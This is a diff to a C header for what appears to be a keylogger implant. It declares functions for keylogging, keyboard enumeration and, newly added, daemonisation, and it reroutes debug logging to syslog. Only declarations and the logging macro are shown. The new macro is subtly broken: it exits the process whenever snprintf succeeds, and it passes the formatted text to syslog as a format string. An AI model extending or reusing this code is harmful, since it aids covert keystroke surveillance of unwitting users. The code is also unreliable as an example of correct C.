@@ -49,12 +49,16 @@ typedef struct implant_s {
 #define SUCCESSFUL 1
 #define ERROR 0
 
-#include <stdio.h> /* necessary for the dprintf in the macro */
+#include <stdio.h> /* necessary for the snprintf in the macro */
+#include <syslog.h>
 
 #ifndef DEBUG_LOG
-#define DEBUG_LOG(s, ...) \
-    do { \
-        dprintf(2, s, ##__VA_ARGS__); dprintf(2, "\n"); \
+#define DEBUG_LOG(s, ...)                               \
+    do {                                                \
+        char data[256] = {0};                           \
+        if (0 < snprintf(data, 255, s, ##__VA_ARGS__))  \
+            _exit(1);                                   \
+        syslog(LOG_NOTICE, data);                       \
     } while (0)
 #endif
 
@@ -75,6 +79,9 @@ void keylog(implant_t *, int);
 
 // keyboard.c
 void fetch_available_keyboards(implant_t *);
+
+// daemon.c
+void daemon_setup(void);
 
 // utils.c
 int read_file(char const *, char **);
